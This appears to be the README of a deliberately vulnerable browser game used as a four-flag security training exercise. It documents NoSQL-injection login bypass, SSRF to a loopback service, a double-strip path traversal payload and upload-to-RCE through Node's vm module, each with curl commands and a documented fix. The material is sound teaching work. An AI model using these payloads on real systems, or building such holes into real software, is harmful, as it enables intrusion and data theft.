# Mothsong 🜂

A calm 2D browser game — *and* a four-flag security CTF hiding underneath it.

Mothsong is a relaxing exploration game: you are a small luminous moth drifting through
a nocturnal garden, gathering spores of light until your glow brims and the whole grove
*blooms* in answer. It's built to be genuinely worth playing. But the full MERN stack it
runs on contains **four intentional, chainable vulnerabilities**, each with a working,
documented fix, so it doubles as a hands-on training artifact for a CISO-level audience.

> ⚠️ **This application is deliberately insecure.** It stores plaintext passwords,
> executes uploaded code, and fetches arbitrary URLs — on purpose. Run it only in an
> isolated training environment. Never point it at data or networks you care about, and
> take it down when the engagement is over.

---

## The game

- **Character & world:** an original luminous moth adrift in a five-layer parallax
  nocturnal garden — drifting fireflies, hanging lanterns, foreground grass.
- **Controls:** Arrow keys / WASD to move, **space** (or hold-touch on mobile) to glide.
  That's the whole game. Playable in five seconds, no tutorial.
- **The signature moment — The Bloom:** gather enough light and the grove answers.
  Lanterns and flowers open in a cascading wave from the moth, a chord swells, and for a
  few seconds the dark is fully lit — then it settles back to embers.
- **No losing:** fall too far and the moth settles softly on the grass and lifts off
  again. No timers, no game-over.
- **Palette:** *Dusk Amber* — plum-indigo night lit by firefly gold, dusk-rose accents.
  Display type **Fraunces**, UI type **Inter**.
- **Sound:** an optional WebAudio ambient layer (pad drone + pentatonic pickup chimes +
  Bloom chord), **muted by default**, toggled in the game HUD. No autoplay.

Everything runs at a fixed-timestep 60fps loop on Canvas 2D — no image assets, all drawn
procedurally.

---

## Repository layout

```
mothsong/
├── backend/                Express API (Render) — the vulnerable services
│   ├── server.js           boots the public API + the loopback internal service
│   ├── src/
│   │   ├── routes/
│   │   │   ├── auth.js      VULN #1  NoSQL injection → auth bypass
│   │   │   ├── profile.js   VULN #2  SSRF (avatar import)
│   │   │   ├── levels.js    VULN #3  LFI / path traversal
│   │   │   └── mods.js      VULN #4  file upload → RCE
│   │   ├── internal/internalServer.js   the private microservice (SSRF target)
│   │   ├── models/  middleware/  config.js  db.js  app.js
│   ├── levels/             grove.json, hollow.json (game level data)
│   ├── scripts/
│   │   ├── seed.js         generates randomized per-engagement flags + seeds Mongo
│   │   └── verify.js       drives all four exploit chains, reports pass/fail
│   └── render.yaml         Render blueprint
└── frontend/               React + Vite app (Vercel) — the game & all screens
    ├── src/game/           engine.js, audio.js, GameCanvas.jsx  (the game)
    ├── src/pages/          Landing, Login, Register, Play, Leaderboard, Profile
    ├── src/lib/            api.js, auth.jsx
    └── vercel.json
```

---

## Quick start (local)

**Prerequisites:** Node 18+ and a MongoDB you can reach (local `mongod`, Docker, or a
free Atlas cluster).

```bash
# 1) Backend
cd backend
cp .env.example .env            # set MONGO_URI + JWT_SECRET
npm install
npm start                       # first boot AUTO-SEEDS (flags + admin password printed to console)
                                # → http://localhost:4000  (+ loopback internal service :8000)

# 2) Frontend (second terminal)
cd frontend
npm install
npm run dev                     # → http://localhost:5173  (proxies /api → :4000)

# 3) Confirm the box is armed (third terminal)
cd backend
npm run verify                  # exercises all four chains; exits 0 iff 4/4 pass
```

The server **seeds itself on first boot** and prints the four flags and the admin login to
the console **for the operator only** — keep that output private. The flags are stored in
MongoDB (Atlas is durable), so every later restart loads the *same* flags — no shell or
manual step needed. Run `npm run seed` only when you want to deliberately **rotate** every
flag and the admin password for a new cohort.

---

## The four flags

Intended difficulty order. Each vulnerability has a **real fix documented in the source**
right next to the vulnerable code (search for `REAL FIX`). Flags are randomized per run —
the examples below are illustrative.

### #1 — NoSQL injection → authentication bypass
`backend/src/routes/auth.js`

The login handler passes `req.body.username` / `req.body.password` straight into a Mongo
query with no type checking, and passwords are stored plaintext. Send an operator object
instead of a password string:

```bash
curl -X POST http://localhost:4000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'
```

`{ $ne: null }` matches every account, so you log in as **admin** without the password.
The response (and `/api/auth/me`) returns admin's `secretNote`, which holds the flag.

**Fix:** coerce inputs to strings (`String(req.body.password)`), look the user up by
username only, and verify a **hashed** password in app code (bcrypt/argon2). Optionally
add `express-mongo-sanitize` to strip `$`/`.` keys.

### #2 — SSRF → read a private microservice
`backend/src/routes/profile.js` → `backend/src/internal/internalServer.js`

The "import avatar from URL" feature fetches any URL server-side with no allowlist, and
reflects non-image response bodies back in a debug field. A second HTTP server is bound to
`127.0.0.1:8000` only (never exposed to the internet) and serves the flag at its **root** —
`8000` is a common internal/dev port in every standard SSRF payload list, so the intended
discovery is "recognise the SSRF, then hit a default loopback payload," not brute-forcing a
deep path. Reachable *only* by making the backend fetch it for you:

```bash
curl -X POST http://localhost:4000/api/profile/avatar-import \
  -H 'Content-Type: application/json' -H "Authorization: Bearer <token>" \
  -d '{"url":"http://127.0.0.1:8000/"}'
```

The internal service returns JSON containing the flag; because it isn't an image, the
handler echoes it in `debug.bodyPreview`.

**Fix:** resolve the host and reject private/loopback/link-local ranges (re-checking after
redirects), allowlist schemes/hosts, validate `Content-Type` before touching the body, and
never reflect fetched bodies back to the client.

### #3 — LFI / path traversal (incomplete sanitization)
`backend/src/routes/levels.js`

Levels load by filename: `GET /api/levels/asset?name=grove.json`. There's a sanitization
attempt — but it strips `../` exactly once and isn't recursive, so a nested payload
survives and reassembles *after* the strip:

```
....//....//....//....//   --(single .replace of "../")-->   ../../../../
```

`levelsDir` is `backend/game/content/assets/levels` and the flag sits in a fake web-root at
`backend/var/www/html/flag_lfi.txt`, so you need exactly four `....//` to climb
levels→assets→content→game→backend and drop into `var/www/html`. A shorter payload, or a
raw already-`../` path, both get neutralized — only this double-strip bypass reaches it:

```bash
curl "http://localhost:4000/api/levels/asset?name=....//....//....//....//var/www/html/flag_lfi.txt"
```

**Fix:** don't blocklist — resolve the final path and verify it stays inside the levels
directory (`path.resolve` + `startsWith`), or map an allowlisted id → known file and never
accept a path at all.

### #4 — File upload → Remote Code Execution
`backend/src/routes/mods.js`

Logged-in users can upload a `.js` "level mod". A separate, **undocumented** endpoint
(`POST /api/mods/apply`, not linked in the UI, only requires being logged in — no
ownership check) reads a mod by name and executes its contents in a Node `vm` context that
exposes real `require`/`process`. `vm` is not a sandbox, so this is genuine RCE:

```bash
# upload a mod that reads the RCE flag from the server process
printf 'module.exports = process.env.FLAG_RCE;' > exploit.js
curl -X POST http://localhost:4000/api/mods/upload \
  -H "Authorization: Bearer <token>" -F "mod=@exploit.js"
# → { "file": "1699..._exploit.js" }
curl -X POST http://localhost:4000/api/mods/apply \
  -H 'Content-Type: application/json' -H "Authorization: Bearer <token>" \
  -d '{"file":"1699..._exploit.js"}'          # → { "result": "MOTHSONG{rce_...}" }
```

**Fix:** never execute uploaded content — treat mods as data (validated JSON) interpreted
by your own safe runtime. If you must run untrusted code, use a real isolated sandbox
(separate process, dropped privileges, no net/FS, `isolated-vm`/WASM/gVisor), and enforce
ownership on every object reference to kill the IDOR.

---

## Flags & scripts

- **Boot-time seeding (automatic)** — on first boot the server generates fresh random
  `MOTHSONG{...}` flags, persists them in MongoDB, seeds the admin (random plaintext
  password) + demo drifters + scores, and prints the answer key to the logs. On every later
  boot it reloads the *same* flags from MongoDB and re-materialises the ephemeral artifacts
  (`data/flags.json`, the LFI flag file two dirs above `levels/`, and `process.env.FLAG_RCE`).
  Nothing is hardcoded; flags stay stable across restarts.
- **`npm run seed`** — force-**rotates** everything (new flags + admin password) for a new
  cohort. Wipes the flag doc, users, and scores, generates fresh values, and prints them.
- **`npm run verify`** — runs all four exploit chains against a live target and reports
  pass/fail. Point it anywhere with `BASE_URL`:
  ```bash
  BASE_URL=https://mothsong-api.onrender.com npm run verify
  ```
  If a local `data/flags.json` matches the deployment's seed, leaked values are asserted
  for exact equality; otherwise the script still verifies each path works and returns a
  well-formed flag.

`data/flags.json`, `flag_lfi.txt`, and uploaded mods are git-ignored — regenerate them per
engagement with `seed`.

---

## Deployment (free-tier)

Three services on three hosts. The backend **cannot** be pure serverless — the
upload→RCE chain and mod storage need a persistent process + disk — so it runs as a Render
Web Service.

### 1) MongoDB Atlas
Create a free M0 cluster, add a database user, allow network access (`0.0.0.0/0` for a
throwaway training box), and copy the SRV connection string.

### 2) Backend → Render
Deploy `backend/` as a **Web Service** (blueprint in `backend/render.yaml`). Root directory
`backend`, build `npm install`, start `node server.js`, health check `/api/health`.

**No shell needed** (free tier doesn't have one): the server auto-seeds on first boot and
stores the flags in Atlas, so they survive restarts and spin-downs. Read the flags + admin
password from the Render **Logs** tab (look for the `[flags]` banner) after the first
deploy. To rotate flags later, run `npm run seed` locally against the same `MONGO_URI` and
restart the service.

### 3) Frontend → Vercel
Import the repo, set **Root Directory = `frontend`** (Vite preset). `vercel.json` already
rewrites all routes to `index.html` for client-side routing.

### CORS + cookies across two domains (read this carefully)

The frontend (`https://*.vercel.app`) and backend (`https://*.onrender.com`) are different
origins, so:

- The backend sets CORS `origin` to **exactly** the Vercel URL with `credentials: true`
  (`src/app.js`). A wildcard `*` will **not** work with credentials.
- Auth cookies are `SameSite=None; Secure` in production (`src/middleware/auth.js`) so the
  browser will send them cross-site. This requires HTTPS on both ends (Vercel and Render
  both provide it). The app also sends the token as a `Bearer` header as a fallback, so it
  still works even when a browser blocks third-party cookies.

### Environment variables that must match between services

| Variable | Set on | Must equal | Notes |
|---|---|---|---|
| `FRONTEND_ORIGIN` | **Render** | the exact Vercel URL (scheme, no trailing slash) | CORS + cookie origin. Mismatch → browser blocks every authenticated call. |
| `VITE_API_BASE` | **Vercel** | the exact Render URL (no trailing slash) | Where the SPA sends `/api` calls. Baked in at build time — redeploy after changing. |
| `MONGO_URI` | **Render** | your Atlas SRV string (with `/mothsong` db) | — |
| `JWT_SECRET` | **Render** | any long random string | One value; changing it invalidates existing sessions. |
| `INTERNAL_PORT` | **Render** | `8000` (or your choice) | The SSRF target port, as seen from the backend host. Tell `verify` via `INTERNAL_PORT`. |
| `NODE_ENV` | **Render** | `production` | Flips cookies to `SameSite=None; Secure`. |

After both are live: seed on Render, then from anywhere run
`BASE_URL=<render-url> INTERNAL_PORT=8000 npm run verify` to confirm 4/4 before inviting
participants.

---

## Using this as a teaching artifact

Every vulnerable handler carries a `REAL FIX` comment block describing the correct
remediation (and, for #1, why hashing structurally kills the injection, not just patches
it). After the exercise, walk participants through each file: the shape of the bug, why a
plausible-looking mitigation (the single `.replace`, the `.js`-only upload filter, "it's
only an internal service") fails, and what a real fix looks like. The four bugs are also
chainable in a narrative — bypass auth, pivot internally via SSRF, read files via LFI, then
land code execution — which makes for a good guided kill-chain walkthrough.
